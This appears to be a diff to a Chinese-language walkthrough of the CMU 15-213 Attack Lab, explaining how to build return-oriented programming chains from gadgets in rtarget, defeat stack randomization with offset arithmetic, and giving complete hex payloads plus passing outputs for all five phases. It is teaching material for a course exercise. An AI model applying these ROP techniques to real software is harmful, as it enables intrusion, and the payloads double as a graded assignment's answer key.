@@ -547,7 +547,7 @@ ROP的全称为Return-oriented programming（返回导向编程）
 注意重点2：程序中已有的小片段
 
 第四和第五个阶段可用的片段为：从``start_farm()``函数开始到``end_farm()``结束中间所有的代码片段。具体如下farm.d文件(自己建立的,实际片段可以在rtarget.d文件(如果没有此文件请看前置工作内容)里面查找)
-farm.d:
+**farm.d:**
 ```c
 
 0000000000401994 <start_farm>:
@@ -761,9 +761,532 @@ Disassembly of section .text:
   4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
   4019ad:	c3                   	retq   
 ```
-可以看到有 ``58 90 c3`` , 对应着是 ``pop %rax , nop , ret``，刚好符合我们的需求。
+可以看到有 ``58 90 c3`` , 对应着是 ``pop %rax , nop , ret``（nop是不干任何事，不影响结果），刚好符合我们的需求。
 那么就要找到它的地址，可以看到``4019a7:	8d 87 51 73 58 90  ``这个意思是``8d``这个机器码对应的地址是``4019a7``
 那么往后数，``4019a7 + 1 = 4019a8``对应着是``87`` ， ``4019a9``对应着是``51``， ``4019aa``对应着是``73``
 以此类推我们要的``58``就是``4019ab``
 
-所有在返回地址中输入``0x4019ab``那么就会跳到``addval_219()``函数片段里面运行``58 90 c3``
+所有在返回地址中输入``0x4019ab``那么就会跳到``addval_219()``函数片段里面运行机器码``58 90 c3``，对应汇编为 ``pop %rax , nop , ret``
+因为 ``90``机器码对应着是``nop``无任何操作，所有无关紧要。
+这个时候如果返回地址后面跟上cookie值，那么cookie值就会因为pop指令进入到rax寄存器中。现在就要想方设法把cookie值从rax寄存器传递到rdi寄存器里面。
+
+首先想到的是交换指令``xchg``和传递指令``mov``
+目前已经找到了``pop %rax``,但发现``xchg   %eax,%edi``对应的机器码``97``并没有出现在farm.d的机器码里面，所有就不能找到想要的。
+
+这时候就需要换一个思路。
+既然交换内容不行，那么直接传递呢？ ``mov %rax , % rdi``或者 ``movl %eax , %edi``
+查表后可以得到我们需要查找的机器码为``48 89 c7``或者``89 c7``
+
+刚好就能找到``48 89 c7 c3``
+```txt
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3   
+```
+
+注意我们ROP攻击最后肯定要跟上C3，不然返回不回去，然后未知机器码最好慎用！！！
+
+得到地址为``4019a0 + 2 = 4019a2`` , 其实就是往后数，可以理解一下。
+
+## 得到答案
+**phase4.txt :**
+```txt
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+a2 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+答案的流程是:
+```txt
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+<<pop %rax , ret>指令的地址>
+<cookie值>
+<<mov %rax , %rdi , ret>指令的地址>
+<touch2()函数地址>
+```
+所以执行流程就是 ``getbuf() -> pop %rax(从栈顶读入cookie值) - > ret -> mov %rax , %rdi -> ret -> touch2()``
+
+## 总结
+本次实验使用的ROP攻击就是从已有的汇编代码对应的机器码里面拼凑出想要的机器码，从而执行想要执行的汇编代码，完成预期的工作。
+阶段四的工作虽然简单，但是其原理为阶段五打下基础。
+
+如果想快速查询所有可用的机器码可以试试正则表达式
+``(48)* 89 [c-f][0-f] (90)*``
+``5[8-f]``
+
+具体的还是得自己分析可不可以用。
+
+分析方法：
+``90``是nop在你想要的指令和ret指令中间多少个都没问题。
+例如``48 89 c7 c3``和``48 89 c7 90 90 90 c3``是一样的功能
+当然中间这中间放cmp , test , andb , orb 这些指令也是没问题的，就是图中最后一个表格。
+例如 ``48 89 c7 c3``执行的是 ``mov %rax , % rdi , ret``
+ ``48 89 c7 20 c0 08 c0 38 c0 84 c0 c3``执行的是``mov %rax , % rdi , andb %al,%al , orb %al,%al ,cmpb %al,%al,testb %al,al ,ret``
+其中``andb %al,%al``是自己和自己按位且，值不改变
+其中``orb %al,%al``是自己和自己按位或，值不改变
+其中``cmpb %al,%al``是按照自己和自己相减的结果改变条件码，寄存器的值不改变
+其中``testb %al,%al``是按照自己和自己按位且的结果改变条件码，寄存器值不改变
+
+做完阶段四应该要明白ROP攻击的方式是截断原本的机器码(利用程序中已有的小片段截取想要的程序片段)然后使用地址调用 + ret返回的方式实现想要的功能。
+
+**回顾一下ROP方式的操作：**
+
+我们需要查找的机器码为``48 89 c7``或者``89 c7``
+
+刚好就能在以下程序中已有的小片段(``addval_273()``函数里)找到机器码``48 89 c7 c3``
+```txt
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3   
+```
+然后计算``48 89 c7 c3``的起始地址为``0x4018a2``，利用前面阶段所学的知识，ret指令会从栈顶拿取一个(返回)地址放入RIP里面...
+
+# phase5
+阶段五是用ROP攻击去攻击rtarget，从而成功调用``touch3()``函数
+然后阶段五和阶段三的重要区别就是阶段五使用了栈随机。
+
+意味着栈顶的地址每次是变化的。
+
+回想阶段三的流程：
+```txt
+<第一个返回地址>：<mov $<字符串地址>,%rdi , ret>
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+<第一个返回地址>
+<touch3()函数地址>
+<字符串地址>:35 39 62 39 39 37 66 61
+```
+
+阶段三没有栈随机，意味着每次运行<字符串地址>是不会变化的。阶段五会！
+
+所以不能一味的传递一个固定的<字符串地址>就结束了。
+
+**具体情况可用动态调试说明：**
+第一次运行:
+```txt
+┌──Register group: general──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│rax            0x0      0                                  rbx            0x7fffffffdfb8   140737488347064            rcx            0x0      0                                    │
+│rdx            0x7ffff7dcf8c0   140737351841984            rsi            0xc      12                                 rdi            0x607260 6320736                              │
+│rbp            0x7fffffffdea0   0x7fffffffdea0             rsp            0x7ffffffb8dc8   0x7ffffffb8dc8             r8             0x7ffff7fe3540   140737354020160              │
+│r9             0x0      0                                  r10            0x4033d4 4207572                            r11            0x7ffff7b70e10   140737349357072              │
+│r12            0x2      2                                  r13            0x0      0                                  r14            0x0      0                                    │
+│r15            0x0      0                                  rip            0x4017a8 0x4017a8 <getbuf>                  eflags         0x202    [ IF ]                               │
+│cs             0x33     51                                 ss             0x2b     43                                 ds             0x0      0                                    │
+│es             0x0      0                                  fs             0x0      0                                  gs             0x0      0                                    │
+│k0             0x0      0                                  k1             0x0      0                                  k2             0x0      0                                    │
+│k3             0x0      0                                  k4             0x0      0                                  k5             0x0      0                                    │
+│k6             0x0      0                                  k7             0x0      0                                                                                               │
+│                                                                                                                                                                                   │
+│                                                                                                                                                                                   │
+└───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
+B+>│0x4017a8 <getbuf>       sub    $0x28,%rsp                                                                                                                                       │
+   │0x4017ac <getbuf+4>     mov    %rsp,%rdi                                                                                                                                        │
+   │0x4017af <getbuf+7>     callq  0x401b60 <Gets>                                                                                                                                  │
+   │0x4017b4 <getbuf+12>    mov    $0x1,%eax                                                                                                                                        │
+   │0x4017b9 <getbuf+17>    add    $0x28,%rsp                                                                                                                                       │
+   │0x4017bd <getbuf+21>    retq                                                                                                                                                    │
+   │0x4017be                nop                                                                                                                                                     │
+   │0x4017bf                nop                                                                                                                                                     │
+   │0x4017c0 <touch1>       sub    $0x8,%rsp                                                                                                                                        │
+   │0x4017c4 <touch1+4>     movl   $0x1,0x203d0e(%rip)        # 0x6054dc <vlevel>                                                                                                   │
+   │0x4017ce <touch1+14>    mov    $0x4031e5,%edi                                                                                                                                   │
+   │0x4017d3 <touch1+19>    callq  0x400cc0 <puts@plt>                                                                                                                              │
+   │0x4017d8 <touch1+24>    mov    $0x1,%edi                                                                                                                                        │
+   └────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
+native process 2211 In: getbuf                                                                                                                                    L12   PC: 0x4017a8 
+
+(gdb) r -q
+Starting program: /home/xiaojuer/experimet/target1/rtarget -q
+
+Breakpoint 1, getbuf () at buf.c:12
+(gdb) 
+
+```
+第二次运行:
+```txt
+┌──Register group: general──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│rax            0x0      0                                  rbx            0x7fffffffdfb8   140737488347064            rcx            0x0      0                                    │
+│rdx            0x7ffff7dcf8c0   140737351841984            rsi            0xc      12                                 rdi            0x607260 6320736                              │
+│rbp            0x7fffffffdea0   0x7fffffffdea0             rsp            0x7ffffff8db58   0x7ffffff8db58             r8             0x7ffff7fe3540   140737354020160              │
+│r9             0x0      0                                  r10            0x4033d4 4207572                            r11            0x7ffff7b70e10   140737349357072              │
+│r12            0x2      2                                  r13            0x0      0                                  r14            0x0      0                                    │
+│r15            0x0      0                                  rip            0x4017a8 0x4017a8 <getbuf>                  eflags         0x206    [ PF IF ]                            │
+│cs             0x33     51                                 ss             0x2b     43                                 ds             0x0      0                                    │
+│es             0x0      0                                  fs             0x0      0                                  gs             0x0      0                                    │
+│k0             0x0      0                                  k1             0x0      0                                  k2             0x0      0                                    │
+│k3             0x0      0                                  k4             0x0      0                                  k5             0x0      0                                    │
+│k6             0x0      0                                  k7             0x0      0                                                                                               │
+│                                                                                                                                                                                   │
+│                                                                                                                                                                                   │
+   ┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+B+>│0x4017a8 <getbuf>       sub    $0x28,%rsp                                                                                                                                       │
+   │0x4017ac <getbuf+4>     mov    %rsp,%rdi                                                                                                                                        │
+   │0x4017af <getbuf+7>     callq  0x401b60 <Gets>                                                                                                                                  │
+   │0x4017b4 <getbuf+12>    mov    $0x1,%eax                                                                                                                                        │
+   │0x4017b9 <getbuf+17>    add    $0x28,%rsp                                                                                                                                       │
+   │0x4017bd <getbuf+21>    retq                                                                                                                                                    │
+   │0x4017be                nop                                                                                                                                                     │
+   │0x4017bf                nop                                                                                                                                                     │
+   │0x4017c0 <touch1>       sub    $0x8,%rsp                                                                                                                                        │
+   │0x4017c4 <touch1+4>     movl   $0x1,0x203d0e(%rip)        # 0x6054dc <vlevel>                                                                                                   │
+   │0x4017ce <touch1+14>    mov    $0x4031e5,%edi                                                                                                                                   │
+   │0x4017d3 <touch1+19>    callq  0x400cc0 <puts@plt>                                                                                                                              │
+   │0x4017d8 <touch1+24>    mov    $0x1,%edi                                                                                                                                        │
+   └────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
+native process 2216 In: getbuf                                                                                                                                    L12   PC: 0x4017a8 
+
+(gdb) r -q
+Starting program: /home/xiaojuer/experimet/target1/rtarget -q
+
+Breakpoint 1, getbuf () at buf.c:12
+(gdb) r -q
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/xiaojuer/experimet/target1/rtarget -q
+Cookie: 0x59b997fa
+Breakpoint 1, getbuf () at buf.c:12
+(gdb) 
+
+```
+第三次运行:
+```txt
+┌──Register group: general──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│rax            0x0      0                                  rbx            0x7fffffffdfb8   140737488347064            rcx            0x0      0                                    │
+│rdx            0x7ffff7dcf8c0   140737351841984            rsi            0xc      12                                 rdi            0x607260 6320736                              │
+│rbp            0x7fffffffdea0   0x7fffffffdea0             rsp            0x7ffffffe6728   0x7ffffffe6728             r8             0x7ffff7fe3540   140737354020160              │
+│r9             0x0      0                                  r10            0x4033d4 4207572                            r11            0x7ffff7b70e10   140737349357072              │
+│r12            0x2      2                                  r13            0x0      0                                  r14            0x0      0                                    │
+│r15            0x0      0                                  rip            0x4017a8 0x4017a8 <getbuf>                  eflags         0x206    [ PF IF ]                            │
+│cs             0x33     51                                 ss             0x2b     43                                 ds             0x0      0                                    │
+│es             0x0      0                                  fs             0x0      0                                  gs             0x0      0                                    │
+│k0             0x0      0                                  k1             0x0      0                                  k2             0x0      0                                    │
+│k3             0x0      0                                  k4             0x0      0                                  k5             0x0      0                                    │
+│k6             0x0      0                                  k7             0x0      0                                                                                               │
+│                                                                                                                                                                                   │
+│                                                                                                                                                                                   │
+└───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
+B+>│0x4017a8 <getbuf>       sub    $0x28,%rsp                                                                                                                                       │
+   │0x4017ac <getbuf+4>     mov    %rsp,%rdi                                                                                                                                        │
+   │0x4017af <getbuf+7>     callq  0x401b60 <Gets>                                                                                                                                  │
+   │0x4017b4 <getbuf+12>    mov    $0x1,%eax                                                                                                                                        │
+   │0x4017b9 <getbuf+17>    add    $0x28,%rsp                                                                                                                                       │
+   │0x4017bd <getbuf+21>    retq                                                                                                                                                    │
+   │0x4017be                nop                                                                                                                                                     │
+   │0x4017bf                nop                                                                                                                                                     │
+   │0x4017c0 <touch1>       sub    $0x8,%rsp                                                                                                                                        │
+   │0x4017c4 <touch1+4>     movl   $0x1,0x203d0e(%rip)        # 0x6054dc <vlevel>                                                                                                   │
+   │0x4017ce <touch1+14>    mov    $0x4031e5,%edi                                                                                                                                   │
+   │0x4017d3 <touch1+19>    callq  0x400cc0 <puts@plt>                                                                                                                              │
+   │0x4017d8 <touch1+24>    mov    $0x1,%edi                                                                                                                                        │
+   └────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
+native process 2217 In: getbuf                                                                                                                                    L12   PC: 0x4017a8 
+
+Breakpoint 1, getbuf () at buf.c:12
+(gdb) r -q
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/xiaojuer/experimet/target1/rtarget -q
+
+Breakpoint 1, getbuf () at buf.c:12
+(gdb) r -q
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/xiaojuer/experimet/target1/rtarget -q
+
+Breakpoint 1, getbuf () at buf.c:12
+
+```
+
+注意看三次运行的 rsp 寄存器的值都不一样，第一次是``rsp            0x7ffffffb8dc8   0x7ffffffb8dc8``;第二次是``rsp            0x7ffffff8db58   0x7ffffff8db58 ``;第三次是``rsp            0x7ffffffe6728   0x7ffffffe6728``
+
+这就是所谓的栈随机。而阶段三是固定的，所以你可以用一个固定的地址传入rdi寄存器内就结束了。
+
+那么栈是随机的怎么办呢？
+
+这里给出思考流程。
+虽然每次栈顶地址是随机的，但我每次放入cookie字符串的地址相对栈顶地址的这个差值是不变的。
+举个例子：
+我用阶段三的答案来演示一遍：
+第一次运行(运行完``Gets()``函数后)栈顶地址为``0x7ffffffe39e0``，cookie字符串地址为``0x7ffffffe3a20``
+```txt
+(gdb) x/80xb $rsp
+0x7ffffffe39e0: 0xc7    0x05    0x0e    0x2d    0x20    0x00    0x01    0xc3
+0x7ffffffe39e8: 0x48    0xc7    0xc7    0xfa    0x97    0xb9    0x59    0xc3
+0x7ffffffe39f0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x7ffffffe39f8: 0x58    0x97    0xc3    0x00    0x00    0x00    0x00    0x00
+0x7ffffffe3a00: 0x5f    0xc3    0x00    0x00    0x00    0x00    0x00    0x00
+0x7ffffffe3a08: 0x90    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
+0x7ffffffe3a10: 0xc8    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
+0x7ffffffe3a18: 0xfa    0x18    0x40    0x00    0x00    0x00    0x00    0x00
+0x7ffffffe3a20: 0x35    0x39    0x62    0x39    0x39    0x37    0x66    0x61
+0x7ffffffe3a28: 0x00    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+```
+第二次运行(运行完``Gets()``函数后)栈顶地址为``0x7ffffff935c0``，cookie字符串地址为``0x7ffffff93600``
+```txt
+(gdb) x/80xb $rsp
+0x7ffffff935c0: 0xc7    0x05    0x0e    0x2d    0x20    0x00    0x01    0xc3
+0x7ffffff935c8: 0x48    0xc7    0xc7    0xfa    0x97    0xb9    0x59    0xc3
+0x7ffffff935d0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x7ffffff935d8: 0x58    0x97    0xc3    0x00    0x00    0x00    0x00    0x00
+0x7ffffff935e0: 0x5f    0xc3    0x00    0x00    0x00    0x00    0x00    0x00
+0x7ffffff935e8: 0x90    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
+0x7ffffff935f0: 0xc8    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
+0x7ffffff935f8: 0xfa    0x18    0x40    0x00    0x00    0x00    0x00    0x00
+0x7ffffff93600: 0x35    0x39    0x62    0x39    0x39    0x37    0x66    0x61
+0x7ffffff93608: 0x00    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+```
+
+用cookie字符串地址减去栈顶地址发现这个差值是不变的。
+说明我们可用基地址加偏移的方式去找到<cookie字符串地址>，然后将其放进rdi里面。
+
+注意到我们有现成的基地址加偏移的函数(都是叫add_xy)为：
+```c
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	retq  
+```
+
+那么如果把栈指针rsp传入rdi寄存器中，然后把计算好的偏移量(差值)放入rsi寄存器里面，再调用``add_xy()``函数，cookie字符串的地址就自然出来了，然后把rax寄存器的内容放进rdi寄存器里面再调用``touch3()``函数就可成功PASS了！
+
+
+流程:
+```txt
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+<<mov %rsp,%rdi ,ret>的地址>
+<<mov <偏移量>,%rsi ,ret>的地址>
+<<mov %rax,%rdi ,ret>的地址>
+```
+当然肯定不止这三个简单的步骤，可能需要拆分为小步骤来合起来。
+
+接下来只演示如何从头到尾PASS的流程（包含一些步骤的思考）：
+
+首先要mov %rsp,%rdi 对应机器码``48 89 e7``,注意先查找``89 e7``,因为从movl指令变为movq指令只是在前面加了机器码``48``(看表格可知道的规律)
+发现没有。
+
+**注意：传递地址时候最好不要用movl,用movq传递完整地址是最好的**
+
+那么如果有寄存器中转呢？
+现在就要查找 mov %rsp , ??? , 能放到哪一个寄存器里面？
+从第一个开始 mov %rsp , %rax ，对应 ``48 89 e0``
+
+找到
+```txt
+0000000000401aab <setval_350>:
+  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
+  401ab1:	c3                   	retq    
+```
+对应地址为:0x401aad
+
+然后找能不能从rax寄存器到rdi寄存器里面 ``48 89 c7``
+找到
+```txt
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq   
+```
+对应地址为:0x4019a2
+
+做完以后要读取偏移量，因为直接用 ``mov <偏移量>,%rsi`` 不太好实现。
+所以如果偏移量在栈里面，用pop指令取读取是更快的。
+
+首先找能不能一步到位 ``pop %rsi`` , ``5e``
+发现没有。
+
+那么找其他pop指令，例如``58`` （pop %rax）
+找到其中一个：
+```txt
+00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3       
+```
+对应地址为:0x4019cc
+
+现在就想办法从rax到rsi中，正难则反，看看什么能到rsi里面去。
+查找Destination D是rsi的一列
+
+找到了：``movl %ecx , %esi`` (``89 ce``)
+```txt
+0000000000401a11 <addval_436>:
+  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
+  401a17:	c3                   	retq  
+```
+对应地址为:0x401a13
+
+然后找找能不能``mov %rax , %rcx``(``48 89 c1``)
+很可惜没有，这时候试试交换指令
+```
+  91   XCHG   %ecx,%eax   交换寄存器内容   eax,ecx   
+```
+
+发现刚好有：
+```txt
+0000000000401a5a <setval_299>:
+  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
+  401a60:	c3                   	retq   
+```
+对应地址为:0x401a5f
+
+这时候如果调用``add_xy()``函数，那么cookie字符串地址就在rax寄存器里面，我们需要转移到rdi寄存器里面即可。
+从rax寄存器到rdi寄存器里面对应地址为:0x4019a2(上面找到过)
+
+最后计算一下偏移量或者动态调试出偏移量：
+
+先将如何静态计算：
+最后答案先变为：
+**phase5:**
+```txt
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+3c 1a 40 00 00 00 00 00 // <mov %rsp , %rax , ret>的地址
+a2 19 40 00 00 00 00 00 // <mov %rax , %rdi , ret>的地址
+cc 19 40 00 00 00 00 00 // <pop %rax , ret>的地址
+<偏移量>
+5f 1a 40 00 00 00 00 00 // <XCHG %ecx,%eax , ret>的地址
+13 1a 40 00 00 00 00 00 // <movl %ecx , %esi , ret>的地址
+d6 19 40 00 00 00 00 00 // add_xy()函数地址
+a2 19 40 00 00 00 00 00 // <mov %rax , %rdi  , ret>的地址
+fa 18 40 00 00 00 00 00 // touch3()函数地址
+35 39 62 39 39 37 66 61 //cookie字符串
+```
+在``mov %rsp , %rax``的时候栈地址就出来了，并且是``a2 19 40 00 00 00 00 00``该行的首地址。
+那么cookie字符串的地址和该行的首地址差了8行(不要算上``mov %rsp , %rax``这一行)，每行8个字节那就是差了64个字节，也就是0x40个字节，所以偏移量就填``40``
+
+动态调试的话，可以执行到 栈顶地址进入了 rdi 里面再打印即可
+```txt
+┌──Register group: general──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│rax            0x7ffffffe2bf0   140737488235504            rbx            0x7fffffffdfb8   140737488347064            rcx            0x6076e9 6321897                              │
+│rdx            0xa      10                                 rsi            0x31     49                                 rdi            0x7ffffffe2bf0   140737488235504              │
+│rbp            0x7fffffffdea0   0x7fffffffdea0             rsp            0x7ffffffe2bf8   0x7ffffffe2bf8             r8             0x77     119                                  │
+│r9             0x0      0                                  r10            0x607010 6320144                            r11            0x246    582                                  │
+│r12            0x2      2                                  r13            0x0      0                                  r14            0x0      0                                    │
+│r15            0x0      0                                  rip            0x4019a5 0x4019a5 <addval_273+5>            eflags         0x206    [ PF IF ]                            │
+│cs             0x33     51                                 ss             0x2b     43                                 ds             0x0      0                                    │
+│es             0x0      0                                  fs             0x0      0                                  gs             0x0      0                                    │
+│k0             0x0      0                                  k1             0x0      0                                  k2             0x0      0                                    │
+│k3             0x0      0                                  k4             0x0      0                                  k5             0x0      0                                    │
+│k6             0x0      0                                  k7             0x0      0                                                                                               │
+│                                                                                                                                                                                   │
+│                                                                                                                                                                                   │
+   ┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+   │0x4019a0 <addval_273>   lea    -0x3c3876b8(%rdi),%eax                                                                                                                           │
+   │0x4019a6 <addval_273+6> retq                                                                                                                                                    │
+>  │0x4019a7 <addval_219>   lea    -0x6fa78caf(%rdi),%eax                                                                                                                           │
+   │0x4019ad <addval_219+6> retq                                                                                                                                                    │
+   │0x4019ae <setval_237>   movl   $0xc7c78948,(%rdi)                                                                                                                               │
+   │0x4019b4 <setval_237+6> retq                                                                                                                                                    │
+   │0x4019b5 <setval_424>   movl   $0x9258c254,(%rdi)                                                                                                                               │
+   │0x4019bb <setval_424+6> retq                                                                                                                                                    │
+   │0x4019bc <setval_470>   movl   $0xc78d4863,(%rdi)                                                                                                                               │
+   │0x4019c2 <setval_470+6> retq                                                                                                                                                    │
+   │0x4019c3 <setval_426>   movl   $0x90c78948,(%rdi)                                                                                                                               │
+   │0x4019c9 <setval_426+6> retq                                                                                                                                                    │
+   │0x4019ca <getval_280>   mov    $0xc3905829,%eax                                                                                                                                 │
+   └────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
+native process 2444 In: addval_273                                                                                                                                L??   PC: 0x4019a5 
+0x0000000000401ab0 in setval_350 ()
+0x0000000000401ab1 in setval_350 ()
+0x00000000004019a2 in addval_273 ()
+0x00000000004019a5 in addval_273 ()
+(gdb) x/80xb $rdi
+0x7ffffffe2bf0: 0xa2    0x19    0x40    0x00    0x00    0x00    0x00    0x00
+0x7ffffffe2bf8: 0xcc    0x19    0x40    0x00    0x00    0x00    0x00    0x00
+0x7ffffffe2c00: 0x40    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x7ffffffe2c08: 0x5f    0x1a    0x40    0x00    0x00    0x00    0x00    0x00
+0x7ffffffe2c10: 0x13    0x1a    0x40    0x00    0x00    0x00    0x00    0x00
+0x7ffffffe2c18: 0xd6    0x19    0x40    0x00    0x00    0x00    0x00    0x00
+0x7ffffffe2c20: 0xa2    0x19    0x40    0x00    0x00    0x00    0x00    0x00
+0x7ffffffe2c28: 0xfa    0x18    0x40    0x00    0x00    0x00    0x00    0x00
+0x7ffffffe2c30: 0x35    0x39    0x62    0x39    0x39    0x37    0x66    0x61
+0x7ffffffe2c38: 0x00    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+```
+``0x7ffffffe2c30 - 0x7ffffffe2bf0 = 0x40``
+偏移量就是``0x40``
+# 最后答案就是：
+```txt
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ad 1a 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+cc 19 40 00 00 00 00 00
+40 00 00 00 00 00 00 00
+5f 1a 40 00 00 00 00 00
+13 1a 40 00 00 00 00 00
+d6 19 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61
+```
+
+# 结束语
+
+最后5 PASS送给各位~
+```txt
+xiaojuer@ubuntu:~/experimet/target1$ cat phase5.txt | ./hex2raw | ./rtarget -q
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 40 00 00 00 00 00 00 00 5F 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
+xiaojuer@ubuntu:~/experimet/target1$ cat phase4.txt | ./hex2raw | ./rtarget -q
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
+xiaojuer@ubuntu:~/experimet/target1$ cat phase3.txt | ./hex2raw | ./ctarget -q
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:3:C7 05 0E 2D 20 00 01 C3 48 C7 C7 FA 97 B9 59 C3 00 00 00 00 00 00 00 00 58 97 C3 00 00 00 00 00 5F C3 00 00 00 00 00 00 90 DC 61 55 00 00 00 00 B8 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
+xiaojuer@ubuntu:~/experimet/target1$ cat phase2.txt | ./hex2raw | ./ctarget -q
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:2:C7 05 0E 2D 20 00 01 C3 48 C7 C7 FA 97 B9 59 C3 00 00 00 00 00 00 00 00 58 97 C3 00 00 00 00 00 5F C3 00 00 00 00 00 00 90 DC 61 55 00 00 00 00 FA 97 B9 59 00 00 00 00 EC 17 40 00 00 00 00 00 
+xiaojuer@ubuntu:~/experimet/target1$ cat phase1.txt | ./hex2raw | ./ctarget -q
+Cookie: 0x59b997fa
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
+
+```
